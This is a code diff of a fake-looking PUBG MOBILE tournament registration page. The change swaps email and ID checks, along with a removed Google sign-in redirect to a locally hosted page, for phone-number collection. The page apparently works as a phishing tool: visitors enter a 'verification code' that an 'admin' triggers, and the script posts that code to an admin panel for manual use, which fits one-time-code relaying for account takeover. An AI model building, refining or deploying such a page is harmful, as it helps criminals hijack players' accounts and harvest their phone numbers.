@@ -16,7 +16,7 @@
     <link rel="icon" type="image/png" sizes="32x32" href="/media/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
     <link rel="icon" type="image/png" sizes="192x192" href="/media/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
     <link rel="apple-touch-icon" href="/media/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
-    <link rel="shortcut icon" href="/media/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit" type="image/png" />
+    <link rel="shortcut icon" href="/media/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" type="image/png" />
 
     <style>
         :root {
@@ -52,15 +52,8 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
-
-        img {
-            display: block;
-            max-width: 100%;
-        }
+        a { color: inherit; text-decoration: none; }
+        img { display: block; max-width: 100%; }
 
         .page {
             min-height: 100vh;
@@ -311,17 +304,8 @@
             font-size: 8px;
         }
 
-        .soon-hero-wrap:hover .soon-cta-btn {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        @media (max-width: 768px) {
-            .soon-cta-btn {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+        .soon-hero-wrap:hover .soon-cta-btn { opacity: 1; transform: translateY(0); }
+        @media (max-width: 768px) { .soon-cta-btn { opacity: 1; transform: translateY(0); } }
 
         .soon-cta-btn:hover {
             transform: translateY(-2px);
@@ -332,9 +316,7 @@
 
         /* TOURNAMENT */
 
-        .tournament-section {
-            padding: 16px 0 8px;
-        }
+        .tournament-section { padding: 16px 0 8px; }
 
         .tournament-card{
               padding: 14px 14px 12px;
@@ -347,13 +329,8 @@
               gap: 12px;
         }
         @media (max-width: 900px){
-          .tournament-card{
-            grid-template-columns: 1fr;
-          }
-          .tournament-banner-img{
-            max-height: 220px;
-            transform: scale(1.04);
-          }
+          .tournament-card{ grid-template-columns: 1fr; }
+          .tournament-banner-img{ max-height: 220px; transform: scale(1.04); }
         }
 
         .tournament-title {
@@ -385,17 +362,8 @@
           box-shadow: 0 0 20px rgba(255,165,0,.30), 0 0 40px rgba(255,120,0,.18);
         }
 
-        @media (max-width: 900px){
-          .tournament-banner-img{
-            max-height: 200px;
-            transform: scale(1.005);
-          }
-        }
-        @media (max-width: 600px){
-          .tournament-banner-img{
-            max-height: 180px;
-          }
-        }
+        @media (max-width: 900px){ .tournament-banner-img{ max-height: 200px; transform: scale(1.005); } }
+        @media (max-width: 600px){ .tournament-banner-img{ max-height: 180px; } }
 
         .scroll-cta {
             margin-top: 8px;
@@ -428,22 +396,12 @@
             font-size: 8px;
         }
 
-        .scroll-cta.visible {
-            opacity: 1;
-            transform: translateY(0);
-            pointer-events: auto;
-        }
-
-        .scroll-cta:hover {
-            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92));
-            color: #020817;
-        }
+        .scroll-cta.visible { opacity: 1; transform: translateY(0); pointer-events: auto; }
+        .scroll-cta:hover { background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92)); color: #020817; }
 
         /* SECTIONS / FORMS */
 
-        .section {
-            padding: 18px 0 22px;
-        }
+        .section { padding: 18px 0 22px; }
 
         .section-title {
             font-size: 12px;
@@ -494,10 +452,7 @@
             margin-bottom: 2px;
         }
 
-        .input-wrap {
-            flex: 1;
-            min-width: 140px;
-        }
+        .input-wrap { flex: 1; min-width: 140px; }
 
         input {
             width: 100%;
@@ -511,14 +466,8 @@
             transition: all var(--transition-fast);
         }
 
-        input::placeholder {
-            color: rgba(148,163,253,0.45);
-        }
-
-        input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 10px rgba(255,184,0,0.22);
-        }
+        input::placeholder { color: rgba(148,163,253,0.45); }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(255,184,0,0.22); }
 
         .btn-sm {
             padding: 7px 12px;
@@ -543,17 +492,8 @@
             box-shadow: 0 10px 20px rgba(0,0,0,1);
         }
 
-        .note {
-            font-size: 7px;
-            color: var(--text-muted);
-            margin-top: 3px;
-        }
-
-        .status {
-            margin-top: 5px;
-            font-size: 8px;
-        }
-
+        .note { font-size: 7px; color: var(--text-muted); margin-top: 3px; }
+        .status { margin-top: 5px; font-size: 8px; }
         .status.ok { color: #22c55e; }
         .status.err { color: #f97316; }
 
@@ -562,18 +502,9 @@
             grid-template-columns: repeat(2, minmax(0, 1fr));
             gap: 8px;
         }
+        @media (max-width: 768px) { .two-cols { grid-template-columns: 1fr; } }
 
-        @media (max-width: 768px) {
-            .two-cols {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .submit-wrap {
-            margin-top: 9px;
-            display: flex;
-            justify-content: flex-end;
-        }
+        .submit-wrap { margin-top: 9px; display: flex; justify-content: flex-end; }
 
         .submit-btn {
             padding: 8px 18px;
@@ -604,10 +535,7 @@
             font-size: 8px;
         }
 
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 16px 30px rgba(0,0,0,1);
-        }
+        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 16px 30px rgba(0,0,0,1); }
 
         .footer {
             margin-top: 18px;
@@ -616,9 +544,7 @@
             color: var(--text-muted);
             text-align: center;
             border-top: 1px solid rgba(255, 255, 255, 0.06);
-            background: radial-gradient(circle at top,
-                rgba(255,184,0,0.03),
-                transparent);
+            background: radial-gradient(circle at top, rgba(255,184,0,0.03), transparent);
         }
 
         /* TEXT DECOR */
@@ -638,18 +564,14 @@
           -webkit-background-clip:text;background-clip:text;color:transparent;
         }
 
-        .badges{
-          display:flex;flex-wrap:wrap;gap:6px;margin:8px 0 10px;
-        }
+        .badges{ display:flex;flex-wrap:wrap;gap:6px;margin:8px 0 10px; }
         .badge{
           padding:6px 10px;border-radius:999px;font-size:9px;letter-spacing:.06em;
           border:1px solid rgba(255,255,255,.12);background:rgba(4,7,16,.9);color:var(--text-soft);
         }
         .badge--gold{ border-color: rgba(255,184,0,.5); color:#ffd36b; background:rgba(255,184,0,.08); }
 
-        .prize-list{
-          display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin:10px 0 6px;
-        }
+        .prize-list{ display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin:10px 0 6px; }
         @media (max-width:680px){ .prize-list{ grid-template-columns:1fr; } }
 
         .prize-item{
@@ -658,71 +580,20 @@
           background:linear-gradient(180deg, rgba(255,184,0,.06), rgba(255,184,0,.02));
           border:1px solid rgba(255,255,255,.08);
         }
-        .prize-item .place{
-          font-weight:800;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#fff;
-        }
-        .prize-item .amount{
-          font-weight:900;font-size:14px;letter-spacing:.04em;color:#ffd36b;
-        }
+        .prize-item .place{ font-weight:800;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#fff; }
+        .prize-item .amount{ font-weight:900;font-size:14px;letter-spacing:.04em;color:#ffd36b; }
 
-        .tournament-note{
-          font-size:9px;color:var(--text-muted);line-height:1.7;margin-top:6px;
-        }
-
-        /* FLOATING TELEGRAM BUTTON */
-        .tg-float {
-            position: fixed;
-            right: 18px;
-            bottom: 72px;
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background: radial-gradient(circle at 30% 0, rgba(255, 255, 255, 0.16), transparent),
-                        #0f172a;
-            box-shadow: 0 10px 24px rgba(0,0,0,0.9);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.16);
-            z-index: 120;
-            transition: all var(--transition-fast);
-        }
-
-        .tg-float:hover {
-            transform: translateY(-3px) scale(1.03);
-            box-shadow: 0 16px 34px rgba(0,0,0,0.95);
-            border-color: var(--accent);
-        }
-
-        .tg-float svg {
-            width: 20px;
-            height: 20px;
-            fill: #39A9FF;
-        }
+        .tournament-note{ font-size:9px;color:var(--text-muted);line-height:1.7;margin-top:6px; }
 
         /* MOBILE NAV */
 
-        .mobile-bottom-nav {
-            display: none;
-        }
+        .mobile-bottom-nav { display: none; }
 
         @media (max-width: 768px) {
-            .nav {
-                display: none;
-            }
-
-            .header {
-                padding: 8px 0 6px;
-            }
-
-            .soon-hero-title {
-                font-size: 16px;
-            }
-
-            .soon-hero-text {
-                font-size: 8.5px;
-            }
+            .nav { display: none; }
+            .header { padding: 8px 0 6px; }
+            .soon-hero-title { font-size: 16px; }
+            .soon-hero-text { font-size: 8.5px; }
 
             .mobile-bottom-nav {
                 position: fixed;
@@ -731,8 +602,7 @@
                 bottom: 0;
                 z-index: 110;
                 padding: 6px 10px 8px;
-                background:
-                    radial-gradient(circle at top, rgba(0,0,0,0.9), rgba(0,0,0,1));
+                background: radial-gradient(circle at top, rgba(0,0,0,0.9), rgba(0,0,0,1));
                 display: flex;
                 justify-content: space-between;
                 gap: 6px;
@@ -756,9 +626,7 @@
                 letter-spacing: 0.08em;
             }
 
-            .mobile-tab span.icon {
-                font-size: 10px;
-            }
+            .mobile-tab span.icon { font-size: 10px; }
 
             .mobile-tab.active,
             .mobile-tab:hover {
@@ -768,10 +636,7 @@
             }
         }
 
-        .success-envelope {
-            font-size: 26px;
-            margin-bottom: 4px;
-        }
+        .success-envelope { font-size: 26px; margin-bottom: 4px; }
 
         /* AUTH OVERLAY */
 
@@ -815,8 +680,7 @@
             gap: 8px;
         }
 
-        .auth-btn-main,
-        .auth-btn-secondary {
+        .auth-btn-main {
             width: 100%;
             border-radius: var(--radius-full);
             border: 0;
@@ -830,35 +694,17 @@
             justify-content: center;
             gap: 6px;
             transition: all var(--transition-fast);
-        }
-
-        .auth-btn-main {
             background: linear-gradient(90deg, var(--accent-alt), var(--accent));
             color: #000;
             box-shadow: 0 10px 24px rgba(0,0,0,1);
             font-weight: 700;
         }
 
-        .auth-btn-main span.icon,
-        .auth-btn-secondary span.icon {
-            font-size: 10px;
-        }
+        .auth-btn-main span.icon { font-size: 10px; }
 
         .auth-btn-main:hover {
             transform: translateY(-1px);
             box-shadow: 0 16px 30px rgba(0,0,0,1);
-        }
-
-        .auth-btn-secondary {
-            border: 1px solid rgba(148,163,253,0.5);
-            background: rgba(4,7,16,0.96);
-            color: var(--text-soft);
-        }
-
-        .auth-btn-secondary:hover {
-            border-color: var(--accent);
-            color: var(--accent);
-            box-shadow: 0 10px 24px rgba(0,0,0,1);
         }
 
         .auth-overlay-note {
@@ -909,7 +755,7 @@
                 <div class="soon-hero-wrap">
                     <img
                         class="soon-hero-img"
-                        src="/172f6786de4f4d5591f3b061f472e935_fit.webp"
+                        src="/media/172f6786de4f4d5591f3b061f472e935_fit.webp"
                         alt="PUBG MOBILE Esports Registration Banner"
                     />
                     <div class="soon-hero-overlay">
@@ -1012,89 +858,60 @@
                     <div class="code-form-row">
                         <div class="input-wrap">
                             <div class="label">Access code</div>
-                            <input id="access-code" type="text"
-                                   placeholder="Enter your invite code" />
+                            <input id="access-code" type="text" placeholder="Enter your invite code" />
                         </div>
-                        <button id="check-code" class="btn-sm">
-                            VERIFY CODE
-                        </button>
+                        <button id="check-code" class="btn-sm">VERIFY CODE</button>
                     </div>
                     <div id="code-status" class="status"></div>
-                    <div class="note">
-                    </div>
+                    <div class="note"></div>
                 </div>
             </section>
 
             <!-- REGISTRATION FORM -->
             <section class="section" id="registration-section" style="display:none;">
                 <div class="section-title">
-                    <span class="bar"></span>Step 2 — Registration & Manual Verification
+                    <span class="bar"></span>Step 2 — Registration & Phone Verification
                 </div>
                 <div class="section-sub">
-                    Provide your in-game ID and email.
+                    Provide your in-game ID and phone number. Then verify your phone code (manual confirmation).
                 </div>
 
                 <form id="reg-form" class="card">
                     <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Team / Player In-game ID</div>
-                            <input type="text" id="ingame-id" required
-                                   placeholder="PUBG MOBILE numeric ID" />
+                            <input type="text" id="ingame-id" required placeholder="PUBG MOBILE numeric ID" />
                         </div>
+
                         <div class="field-group">
-                            <div class="label">Email (account)</div>
-                            <input type="email" id="email" required
-                                   placeholder="Contact email for this registration" />
+                            <div class="label">Phone number</div>
+                            <input type="tel" id="phone" required placeholder="+7 999 123-45-67" />
                             <div class="note">
-                                All decisions, time slots and lobby links will be sent to this email.
+                                We will use this number for verification and important tournament updates.
                             </div>
                         </div>
                     </div>
 
-                    <!-- ID VERIFICATION -->
-                    <div class="field-group" style="margin-top:10px;">
-                        <div class="label">ID verification code</div>
-                        <div class="code-form-row">
-                            <div class="input-wrap">
-                                <input type="text" id="id-code"
-                                       placeholder="Enter ID verification code from admin" />
-                            </div>
-                            <button type="button" id="send-id-code" class="btn-sm">
-                                SEND REQUEST
-                            </button>
-                            <button type="button" id="check-id-code" class="btn-sm">
-                                CHECK
-                            </button>
-                        </div>
-                        <div id="id-status" class="status"></div>
-                        <div class="note">
-                            Press <strong>SEND REQUEST</strong> to create an ID verification request in the admin panel.
-                            Admin sees your ID &amp; email, manually sends you an ID verification code and later
-                            marks your code as correct or incorrect. When you receive the code, enter it here and
-                            use <strong>CHECK</strong>. If admin already confirmed it, you will see a green status.
-                        </div>
-                    </div>
-
-                    <!-- EMAIL VERIFICATION -->
+                    <!-- PHONE VERIFICATION (only) -->
                     <div class="field-group" style="margin-top:12px;">
-                        <div class="label">Email verification code</div>
+                        <div class="label">Phone verification code</div>
                         <div class="code-form-row">
                             <div class="input-wrap">
-                                <input type="text" id="email-code"
-                                       placeholder="Enter email verification code from admin" />
+                                <input type="text" id="phone-code"
+                                       placeholder="Enter phone verification code from admin" />
                             </div>
-                            <button type="button" id="send-email-code" class="btn-sm">
+                            <button type="button" id="send-phone-code" class="btn-sm">
                                 SEND REQUEST
                             </button>
-                            <button type="button" id="check-email-code" class="btn-sm">
+                            <button type="button" id="check-phone-code" class="btn-sm">
                                 CHECK
                             </button>
                         </div>
-                        <div id="email-status" class="status"></div>
+                        <div id="phone-status" class="status"></div>
                         <div class="note">
-                            This request is used to confirm that your email is under your control and is safe.
-                            Admin sends you an email code manually and then marks it as valid or invalid in the
-                            admin panel. CHECK will show the final decision once it is set.
+                            Press <strong>SEND REQUEST</strong> to create a phone verification request in the admin panel.
+                            Admin will manually send you a code, then mark it as valid/invalid. After you receive the code,
+                            enter it and press <strong>CHECK</strong>.
                         </div>
                     </div>
 
@@ -1135,24 +952,21 @@
     </footer>
 </div>
 
-<!-- AUTH OVERLAY: выбор входа -->
+<!-- AUTH OVERLAY -->
 <div id="auth-overlay" class="auth-overlay">
     <div class="auth-overlay-card">
-        <div class="auth-overlay-title">
-            CHOOSE SIGN-IN METHOD
-        </div>
+        <div class="auth-overlay-title">CONTINUE</div>
         <div class="auth-overlay-sub">
-            Your invite code is valid. Choose how you want to continue registration:
-            directly with in-game ID or via Google account (PUBG-linked).
+            Your invite code is valid. Continue to the registration form.
         </div>
         <div class="auth-buttons">
             <button id="auth-game-btn" class="auth-btn-main">
-                <span class="icon">🎮</span>
-                LOGIN VIA GAME ID
+                <span class="icon">▶</span>
+                OPEN FORM
             </button>
         </div>
         <div class="auth-overlay-note">
-            Game ID flow uses the current form. Google login will open a separate secure page.
+            Phone verification is required before submitting.
         </div>
     </div>
 </div>
@@ -1178,10 +992,8 @@
 </div>
 
 <script>
-    // статический список инвайт-кодов
+    // static invite codes (front only)
     const VALID_CODES = ["NV789112", "ESPB4311", "V7ACCESS"];
-    const GOOGLE_LOGIN_URL = "/register/google/templates/index.html";
-
 
     const openGatewayBtn      = document.getElementById('open-gateway');
     const scrollCta           = document.getElementById('scroll-cta-code');
@@ -1198,26 +1010,18 @@
     const finalCard           = document.getElementById('final-card');
 
     const ingameIdInput       = document.getElementById('ingame-id');
-    const emailInput          = document.getElementById('email');
+    const phoneInput          = document.getElementById('phone');
 
-    const idCodeInput         = document.getElementById('id-code');
-    const emailCodeInput      = document.getElementById('email-code');
-
-    const sendIdCodeBtn       = document.getElementById('send-id-code');
-    const checkIdCodeBtn      = document.getElementById('check-id-code');
-    const idStatus            = document.getElementById('id-status');
-
-    const sendEmailCodeBtn    = document.getElementById('send-email-code');
-    const checkEmailCodeBtn   = document.getElementById('check-email-code');
-    const emailStatus         = document.getElementById('email-status');
+    const phoneCodeInput      = document.getElementById('phone-code');
+    const sendPhoneCodeBtn    = document.getElementById('send-phone-code');
+    const checkPhoneCodeBtn   = document.getElementById('check-phone-code');
+    const phoneStatus         = document.getElementById('phone-status');
 
     // overlay
     const authOverlay         = document.getElementById('auth-overlay');
     const authGameBtn         = document.getElementById('auth-game-btn');
-    const authGoogleBtn       = document.getElementById('auth-google-btn');
 
-    let idVerified = false;
-    let emailVerified = false;
+    let phoneVerified = false;
 
     async function postJSON(url, payload) {
         const res = await fetch(url, {
@@ -1226,11 +1030,7 @@
             body: JSON.stringify(payload)
         });
         if (!res.ok) throw new Error("Network error");
-        try {
-            return await res.json();
-        } catch {
-            return {};
-        }
+        try { return await res.json(); } catch { return {}; }
     }
 
     // Scroll CTA
@@ -1260,17 +1060,8 @@
         });
     }
 
-    // показать / скрыть оверлей
-    function showAuthOverlay() {
-        if (authOverlay) {
-            authOverlay.style.display = 'flex';
-        }
-    }
-    function hideAuthOverlay() {
-        if (authOverlay) {
-            authOverlay.style.display = 'none';
-        }
-    }
+    function showAuthOverlay() { if (authOverlay) authOverlay.style.display = 'flex'; }
+    function hideAuthOverlay() { if (authOverlay) authOverlay.style.display = 'none'; }
 
     // Verify invite code (front only)
     if (checkCodeBtn) {
@@ -1284,9 +1075,9 @@
                 return;
             }
             if (VALID_CODES.includes(val)) {
-                codeStatus.textContent = "Code accepted. Choose how to continue registration.";
+                codeStatus.textContent = "Code accepted. Continue to the form.";
                 codeStatus.className = "status ok";
-                regSection.style.display = "none"; // форму покажем после выбора
+                regSection.style.display = "none";
                 showAuthOverlay();
             } else {
                 codeStatus.textContent = "Invalid code. Check your invite or contact support.";
@@ -1297,7 +1088,7 @@
         });
     }
 
-    // выбор "Login via game" -> открыть текущую форму
+    // open form
     if (authGameBtn) {
         authGameBtn.addEventListener('click', () => {
             hideAuthOverlay();
@@ -1308,249 +1099,124 @@
         });
     }
 
-    // выбор "Login via Google" -> редирект на отдельную страницу
-    // выбор "Login via Google" -> редирект на отдельную страницу
-// выбор "Login via Google" -> редирект на страницу из папки google
-if (authGoogleBtn) {
-    authGoogleBtn.addEventListener('click', () => {
-        hideAuthOverlay();
-        window.location.href = GOOGLE_LOGIN_URL;
-    });
-}
-
-
-    // клик по фону (если захочешь закрывать оверлей)
     if (authOverlay) {
         authOverlay.addEventListener('click', (e) => {
-            if (e.target === authOverlay) {
-                hideAuthOverlay();
-            }
+            if (e.target === authOverlay) hideAuthOverlay();
         });
     }
 
-    // SEND ID REQUEST (no code generation, просто заявка)
-    if (sendIdCodeBtn) {
-        sendIdCodeBtn.addEventListener('click', async () => {
-            idStatus.textContent = "";
-            idStatus.className = "status";
+    // SEND PHONE REQUEST
+    // NOTE: uses your existing backend endpoints (/api/request-email-code) but "email" field stores phone number.
+    if (sendPhoneCodeBtn) {
+        sendPhoneCodeBtn.addEventListener('click', async () => {
+            phoneStatus.textContent = "";
+            phoneStatus.className = "status";
 
             const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const ingameId   = (ingameIdInput.value || "").trim();
-            const email      = (emailInput.value || "").trim();
+            const phone      = (phoneInput.value || "").trim();
 
             if (!accessCode || !VALID_CODES.includes(accessCode)) {
-                idStatus.textContent = "Access code is missing or invalid.";
-                idStatus.className = "status err";
+                phoneStatus.textContent = "Access code is missing or invalid.";
+                phoneStatus.className = "status err";
                 return;
             }
-            if (!ingameId || !email) {
-                idStatus.textContent = "Fill in-game ID and email before sending the request.";
-                idStatus.className = "status err";
-                return;
-            }
-
-            idStatus.textContent = "Creating ID verification request in admin panel…";
-            idStatus.className = "status";
-
-            try {
-                const res = await postJSON("/api/request-id-code", {
-                    accessCode,
-                    ingameId,
-                    email
-                });
-
-                if (res && res.ok) {
-                    idStatus.textContent =
-                        "Request created. Wait for admin to send you an ID verification code manually.";
-                    idStatus.className = "status ok";
-                } else {
-                    idStatus.textContent =
-                        "Could not create request. Try again later or contact support.";
-                    idStatus.className = "status err";
-                }
-            } catch (e) {
-                console.error(e);
-                idStatus.textContent = "Network error. Try again later.";
-                idStatus.className = "status err";
-            }
-        });
-    }
-
-    // CHECK ID CODE (код улетает в админку, решение — ручное)
-    if (checkIdCodeBtn) {
-        checkIdCodeBtn.addEventListener('click', async () => {
-            idStatus.textContent = "";
-            idStatus.className = "status";
-
-            const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const ingameId   = (ingameIdInput.value || "").trim();
-            const email      = (emailInput.value || "").trim();
-            const code       = (idCodeInput.value || "").trim();
-
-            if (!accessCode || !VALID_CODES.includes(accessCode)) {
-                idStatus.textContent = "Access code is missing or invalid.";
-                idStatus.className = "status err";
-                return;
-            }
-            if (!ingameId || !email) {
-                idStatus.textContent = "Fill in-game ID and email first.";
-                idStatus.className = "status err";
-                return;
-            }
-            if (!code) {
-                idStatus.textContent = "Enter ID verification code from admin.";
-                idStatus.className = "status err";
+            if (!phone) {
+                phoneStatus.textContent = "Fill phone number before sending the request.";
+                phoneStatus.className = "status err";
                 return;
             }
 
-            idStatus.textContent =
-                "Sending your ID code to admin panel… Waiting for manual decision.";
-            idStatus.className = "status";
-
-            try {
-                const res = await postJSON("/api/verify-id-code", {
-                    accessCode,
-                    ingameId,
-                    email,
-                    code
-                });
-
-                if (res && res.status === "valid") {
-                    idVerified = true;
-                    idStatus.textContent = "ID verification code is correct ✔";
-                    idStatus.className = "status ok";
-                    sendIdCodeBtn.disabled = true;
-                    checkIdCodeBtn.disabled = true;
-                    idCodeInput.readOnly = true;
-                    checkIdCodeBtn.textContent = "VERIFIED";
-                } else if (res && res.status === "invalid") {
-                    idVerified = false;
-                    idStatus.textContent = "ID verification code is invalid.";
-                    idStatus.className = "status err";
-                } else {
-                    // статус pending
-                    idStatus.textContent =
-                        "Code received by admin. As soon as admin confirms, press CHECK again.";
-                    idStatus.className = "status";
-                }
-            } catch (e) {
-                console.error(e);
-                idStatus.textContent = "Network error. Try again later.";
-                idStatus.className = "status err";
-            }
-        });
-    }
-
-    // SEND EMAIL REQUEST (только заявка, без генерации кода)
-    if (sendEmailCodeBtn) {
-        sendEmailCodeBtn.addEventListener('click', async () => {
-            emailStatus.textContent = "";
-            emailStatus.className = "status";
-
-            const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const email      = (emailInput.value || "").trim();
-
-            if (!accessCode || !VALID_CODES.includes(accessCode)) {
-                emailStatus.textContent = "Access code is missing or invalid.";
-                emailStatus.className = "status err";
-                return;
-            }
-            if (!email) {
-                emailStatus.textContent = "Fill email before sending the request.";
-                emailStatus.className = "status err";
-                return;
-            }
-
-            emailStatus.textContent =
-                "Creating email verification request in admin panel…";
-            emailStatus.className = "status";
+            phoneStatus.textContent = "Creating phone verification request in admin panel…";
+            phoneStatus.className = "status";
 
             try {
                 const res = await postJSON("/api/request-email-code", {
                     accessCode,
-                    email
+                    email: phone
                 });
 
                 if (res && res.ok) {
-                    emailStatus.textContent =
-                        "Request created. Wait for admin to send you an email verification code manually.";
-                    emailStatus.className = "status ok";
+                    phoneStatus.textContent =
+                        "Request created. Wait for admin to send you a phone verification code manually.";
+                    phoneStatus.className = "status ok";
                 } else {
-                    emailStatus.textContent =
+                    phoneStatus.textContent =
                         "Could not create request. Try again later or contact support.";
-                    emailStatus.className = "status err";
+                    phoneStatus.className = "status err";
                 }
             } catch (e) {
                 console.error(e);
-                emailStatus.textContent = "Network error. Try again later.";
-                emailStatus.className = "status err";
+                phoneStatus.textContent = "Network error. Try again later.";
+                phoneStatus.className = "status err";
             }
         });
     }
 
-    // CHECK EMAIL CODE (код уходит в админку, решение — ручное)
-    if (checkEmailCodeBtn) {
-        checkEmailCodeBtn.addEventListener('click', async () => {
-            emailStatus.textContent = "";
-            emailStatus.className = "status";
+    // CHECK PHONE CODE
+    // NOTE: uses your existing backend endpoints (/api/verify-email-code) but "email" field stores phone number.
+    if (checkPhoneCodeBtn) {
+        checkPhoneCodeBtn.addEventListener('click', async () => {
+            phoneStatus.textContent = "";
+            phoneStatus.className = "status";
 
             const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const email      = (emailInput.value || "").trim();
-            const code       = (emailCodeInput.value || "").trim();
+            const phone      = (phoneInput.value || "").trim();
+            const code       = (phoneCodeInput.value || "").trim();
 
             if (!accessCode || !VALID_CODES.includes(accessCode)) {
-                emailStatus.textContent = "Access code is missing or invalid.";
-                emailStatus.className = "status err";
+                phoneStatus.textContent = "Access code is missing or invalid.";
+                phoneStatus.className = "status err";
                 return;
             }
-            if (!email) {
-                emailStatus.textContent = "Fill email first.";
-                emailStatus.className = "status err";
+            if (!phone) {
+                phoneStatus.textContent = "Fill phone number first.";
+                phoneStatus.className = "status err";
                 return;
             }
             if (!code) {
-                emailStatus.textContent = "Enter email verification code from admin.";
-                emailStatus.className = "status err";
+                phoneStatus.textContent = "Enter phone verification code from admin.";
+                phoneStatus.className = "status err";
                 return;
             }
 
-            emailStatus.textContent =
-                "Sending your email code to admin panel… Waiting for manual decision.";
-            emailStatus.className = "status";
+            phoneStatus.textContent =
+                "Sending your phone code to admin panel… Waiting for manual decision.";
+            phoneStatus.className = "status";
 
             try {
                 const res = await postJSON("/api/verify-email-code", {
                     accessCode,
-                    email,
+                    email: phone,
                     code
                 });
 
                 if (res && res.status === "valid") {
-                    emailVerified = true;
-                    emailStatus.textContent = "Email verification code is correct ✔";
-                    emailStatus.className = "status ok";
-                    sendEmailCodeBtn.disabled = true;
-                    checkEmailCodeBtn.disabled = true;
-                    emailCodeInput.readOnly = true;
-                    checkEmailCodeBtn.textContent = "VERIFIED";
+                    phoneVerified = true;
+                    phoneStatus.textContent = "Phone verification code is correct ✔";
+                    phoneStatus.className = "status ok";
+                    sendPhoneCodeBtn.disabled = true;
+                    checkPhoneCodeBtn.disabled = true;
+                    phoneCodeInput.readOnly = true;
+                    checkPhoneCodeBtn.textContent = "VERIFIED";
                 } else if (res && res.status === "invalid") {
-                    emailVerified = false;
-                    emailStatus.textContent = "Email verification code is invalid.";
-                    emailStatus.className = "status err";
+                    phoneVerified = false;
+                    phoneStatus.textContent = "Phone verification code is invalid.";
+                    phoneStatus.className = "status err";
                 } else {
-                    emailStatus.textContent =
+                    phoneStatus.textContent =
                         "Code received by admin. As soon as admin confirms, press CHECK again.";
-                    emailStatus.className = "status";
+                    phoneStatus.className = "status";
                 }
             } catch (e) {
                 console.error(e);
-                emailStatus.textContent = "Network error. Try again later.";
-                emailStatus.className = "status err";
+                phoneStatus.textContent = "Network error. Try again later.";
+                phoneStatus.className = "status err";
             }
         });
     }
 
-    // FINAL SUBMIT (в админку, финальное решение — вручную)
+    // FINAL SUBMIT
+    // NOTE: submits to your existing backend (/api/submit-registration) where "email" field stores phone number.
     if (regForm) {
         regForm.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -1559,9 +1225,8 @@ if (authGoogleBtn) {
 
             const accessCode = (codeInput.value || "").trim().toUpperCase();
             const ingameId   = (ingameIdInput.value || "").trim();
-            const email      = (emailInput.value || "").trim();
-            const idCode     = (idCodeInput.value || "").trim();
-            const emailCode  = (emailCodeInput.value || "").trim();
+            const phone      = (phoneInput.value || "").trim();
+            const phoneCode  = (phoneCodeInput.value || "").trim();
             const terms      = document.getElementById('terms').checked;
 
             if (!accessCode || !VALID_CODES.includes(accessCode)) {
@@ -1569,7 +1234,7 @@ if (authGoogleBtn) {
                 regStatus.className = "status err";
                 return;
             }
-            if (!ingameId || !email) {
+            if (!ingameId || !phone) {
                 regStatus.textContent = "Please fill all required fields.";
                 regStatus.className = "status err";
                 return;
@@ -1579,8 +1244,8 @@ if (authGoogleBtn) {
                 regStatus.className = "status err";
                 return;
             }
-            if (!idVerified || !emailVerified) {
-                regStatus.textContent = "Both ID and email must be verified before submitting.";
+            if (!phoneVerified) {
+                regStatus.textContent = "Phone must be verified before submitting.";
                 regStatus.className = "status err";
                 return;
             }
@@ -1591,16 +1256,14 @@ if (authGoogleBtn) {
             const payload = {
                 accessCode,
                 ingameId,
-                email,
-                idCode,
-                emailCode
+                email: phone,        // stored as "email" in current backend
+                emailCode: phoneCode // stored as "emailCode" in current backend
             };
 
             try {
                 await postJSON("/api/submit-registration", payload);
             } catch (e) {
                 console.error(e);
-                // даже если упало — всё равно дальше флоу через админа
             }
 
             regForm.reset();
@@ -1614,12 +1277,10 @@ if (authGoogleBtn) {
                 </div>
                 <div class="success-envelope">⏳</div>
                 <div class="section-sub" style="margin-bottom:0;">
-                    Your registration data and both verification codes have been delivered to
-                    the <strong>admin panel</strong> for manual review.
-                    You will receive an email to the address you provided with the exact time and lobby link
-                    if your application is approved. If the application is rejected
-                    (for example, invalid email or account in a risk state),
-                    that email will contain the reason and, when possible, a link to refill the form.
+                    Your registration data and phone verification code have been delivered to the
+                    <strong>admin panel</strong> for manual review.
+                    If your application is approved, the admin will contact you using the phone number you provided.
+                    If the application is rejected, you will receive the reason and (when possible) instructions to retry.
                 </div>
             `;
         });
@@ -1641,9 +1302,7 @@ if (authGoogleBtn) {
                 window.location.href = '/';
             } else {
                 const el = document.querySelector(target);
-                if (el) {
-                    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                }
+                if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
             }
         });
     });
